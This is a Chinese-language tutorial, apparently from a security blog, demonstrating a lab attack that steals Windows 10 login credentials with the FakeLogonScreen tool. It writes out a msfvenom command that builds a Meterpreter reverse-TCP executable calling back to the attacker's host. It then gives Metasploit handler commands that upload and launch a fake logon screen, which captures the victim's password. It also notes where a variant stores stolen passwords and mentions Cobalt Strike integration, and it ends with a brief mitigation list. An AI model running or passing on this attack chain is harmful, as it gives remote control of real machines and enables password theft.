# FakeLogonScreen抓取Windows凭证

### **实践中使用的配置**

**攻击者：**

  **操作系统：** Kali Linux 2020.1

  **IP：** 192.168.1.13

**目标：**

  **作业系统：** Windows 10（Build 18363）

  **IP：** 192.168.1.11

**情境**

有一个系统与攻击者连接到相同的网络，并且攻击者正在寻找目标系统的凭据。目标已经拥有的信息是IP地址和OS系统的知识。这种信息很容易获得。

**有效载荷创建**

现在，我开始使用msfvenom工具根据目标系统的OS来制作有效负载。我以LHOST的身份提供了Kali的IP地址。当目标计算机运行Windows时，我将有效负载设置为可以轻松执行的可执行文件。制作有效负载之后，我运行了Python One-liner以创建一个HTTP服务器，该服务器将在目标计算机的端口80上托管有效负载。

| 12   | msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.233.128 lport=4444 -f exe >> payload.exepython -m SimpleHTTPServer 80 |
| ---- | ------------------------------------------------------------ |
|      |                                                              |

![img](https://i1.wp.com/1.bp.blogspot.com/-VlGWhrAJWaA/XkVIhy6mJ-I/AAAAAAAAiqc/kV9bxccVpQcyUveUZxfxNQbYXG9CLxTbwCLcBGAsYHQ/s1600/1.png?w=687&ssl=1)

现在，在现实生活中，攻击者将使用某种社会工程攻击来操纵目标用户，以将恶意负载下载到他们的系统上。这可以在进行实际攻击之前很长时间完成。

**起始侦听器**

由于我们已经准备好并托管了有效负载。现在我们需要启动一个侦听器，在该侦听器中，我们将从有效负载中接收会话。设置正确的配置后，我直接进入目标计算机并执行了有效负载。同样，这是一个实验室环境演示。实际情况会有所不同。 

**上载FakeLogonScreen可执行文件**

在获得Meterpreter会话之后，我们将FakeLogonScreen.exe上载到目标系统。可以在克隆的目录中找到此可执行文件。成功上传后，我们使用shell命令进入目标计算机的命令行。现在，如给定的图像所示，运行可执行文件。

| 12345678 | use multi/handlerset payload windows/meterpreter/reverse_tcpset lhost 192.168.233.128set lport 4444runupload FakeLogonScreen.exeshellFakeLogonScreen.exe |
| -------- | ------------------------------------------------------------ |
|          |                                                              |

![img](https://i2.wp.com/1.bp.blogspot.com/-AhwYKe4KaOY/XkVIiADvF5I/AAAAAAAAiqg/_Lp_VckUAT0QeLQl6ARhPn9aMFQQ7dNjQCLcBGAsYHQ/s1600/2.png?w=687&ssl=1)

### **在目标端输入凭证**

一旦通过外壳运行了可执行文件，目标系统上的所有当前窗口就会最小化，并弹出登录屏幕，如给定的图像所示。这似乎是一个非常真实的登录屏幕。目标用户假定必须有意外注销。因此，为了承担他/她的工作，目标用户在不知不觉中输入了凭据。

![img](https://i2.wp.com/1.bp.blogspot.com/-rl3LBWC8Le4/XkVIieInM0I/AAAAAAAAiqk/oP9njmDjyBMS4DMl_jiLtE6gFrF8S42mQCLcBGAsYHQ/s1600/3.png?w=687&ssl=1)

现在，为了证明已检查密码，我们首先输入了错误的凭据。登录屏幕返回错误“密码不正确。再试一次”。这证明目标用户必须输入有效的凭据才能通过。

![img](https://i2.wp.com/1.bp.blogspot.com/-zenZFVEMQkU/XkVIixGlkdI/AAAAAAAAiqo/akINf0-4fwUbUaeMb4xVEpphK41kKssIgCLcBGAsYHQ/s1600/4.png?w=687&ssl=1)

接下来，我们输入了有效的凭据，然后看到所有最小化的窗口都恢复了原来的状态。

### **拿取凭证**

让我们回到攻击者机器上，看看我们是否能够获取这些密码。如下图所示，我们看到FakeLogonScreen侦听器的工作方式类似于按键记录器。我们首先在密码字段中输入“密码错误”，以检查错误的情况。然后，我们输入正确的密码“ 123”，并成功获取了目标用户的密码。

![img](https://i1.wp.com/1.bp.blogspot.com/-rZcvC7fT7xk/XkVIiz0BwcI/AAAAAAAAiqs/lDjHk79C8gk-1xtEDhgv7DiI0R513gA3QCLcBGAsYHQ/s1600/5.png?w=687&ssl=1)

### **附加信息**



我们先前下载的zip文件中还有另一个可执行文件。它被命名为“ FakeLogonScreenToFile.exe”。该文件的工作方式类似，但是除了显示密码外，还将密码存储在以下位置：

％LOCALAPPDATA％\ Microsoft \ user.db

该工具也可以在Windows 7上使用。尽管已经达到其终止寿命，但仍有大量系统在生产环境中运行Windows 7。如果需要，可以在“ DOTNET35”目录中找到它。

您还可以集成此工具以与Cobalt Strike一起使用。在**[这里查看](https://raw.githubusercontent.com/bitsadmin/fakelogonscreen/master/demo.gif)**。

### **缓解措施**

- 验证下载源。
- 监视AppData目录中的user.db文件。
- 正确检查登录屏幕中的所有链接。
- 实施较短的密码更改策略。
